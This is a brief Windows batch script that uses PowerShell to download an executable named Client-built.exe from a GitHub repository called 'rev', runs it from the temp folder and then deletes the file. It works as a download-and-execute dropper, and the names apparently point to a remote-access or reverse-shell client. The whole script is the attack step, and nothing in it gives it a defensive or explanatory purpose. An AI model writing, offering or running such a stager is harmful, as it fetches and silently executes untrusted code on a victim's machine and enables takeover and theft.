@echo off
setlocal

set "url=https://github.com/tiraUnderCode/rev/raw/main/Client-built.exe"
set "tempFile=%temp%\Client-built.exe"

powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%tempFile%'"

start "" "%tempFile%"


del "%tempFile%"

endlocal
